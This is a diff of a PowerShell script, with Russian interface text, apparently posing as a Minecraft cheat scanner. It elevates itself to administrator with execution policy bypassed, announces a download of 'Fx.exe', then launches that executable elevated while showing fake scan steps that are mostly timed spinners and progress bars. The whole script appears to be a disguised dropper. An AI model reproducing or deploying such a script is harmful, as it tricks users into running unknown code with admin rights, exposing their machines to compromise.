@@ -4,10 +4,8 @@
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 
 if (-NOT $isAdmin) {
-    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
-    $currentScript = Get-Content $PSCommandPath -Raw
-    $currentScript | Out-File -FilePath $tempScript -Encoding UTF8
-    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -File `"$tempScript`""
+    $originalScript = $PSCommandPath
+    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -File `"$originalScript`""
     exit
 }
 
@@ -33,7 +31,6 @@ if (-not (Test-Path $TARGET_DIR)) {
     New-Item -ItemType Directory -Path $TARGET_DIR -Force | Out-Null
 }
 
-
 Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
 Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
 Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
@@ -54,7 +51,6 @@ function Show-Spinner {
     Write-Host "`r[✓] $text" -ForegroundColor Green
 }
 
-
 Write-Host "`n[1/6] 🔍 Загрузка Fx.exe..." -ForegroundColor Cyan
 
 try {
@@ -73,7 +69,6 @@ try {
 
 Show-Spinner "Анализ DLL и инжекторов..." 15
 
-# ===============================================
 Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
 $waitEnd = (Get-Date).AddSeconds(15)
 while ((Get-Date) -lt $waitEnd) {
@@ -81,24 +76,19 @@ while ((Get-Date) -lt $waitEnd) {
 }
 Show-Spinner "Проверка модов, jars, json..." 0
 
-# ===============================================
 Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
 Show-Spinner "Поиск скрытых читов..." 10
 
-# ===============================================
 Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
 Show-Spinner "Анализ реестра Run/Startup..." 10
 
-# ===============================================
 Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
 for ($p = 0; $p -le 100; $p += 10) {
-    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
     Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
     Start-Sleep 0.5
 }
 Write-Progress -Completed
 
-# ===============================================
 Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
 
 if (Test-Path $ADDEX_PATH) {
@@ -109,7 +99,6 @@ if (Test-Path $ADDEX_PATH) {
 
 Show-Spinner "Проверка Minecraft серверов..." 5
 
-
 if (Test-Path $FX_PATH) {
     try {
         Start-Process -FilePath $FX_PATH -Verb RunAs
@@ -119,9 +108,6 @@ if (Test-Path $FX_PATH) {
     }
 }
 
-# ===============================================
-# ФИНАЛ
-# ===============================================
 $endTime = (Get-Date) - $startTime
 Clear-Host
 Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
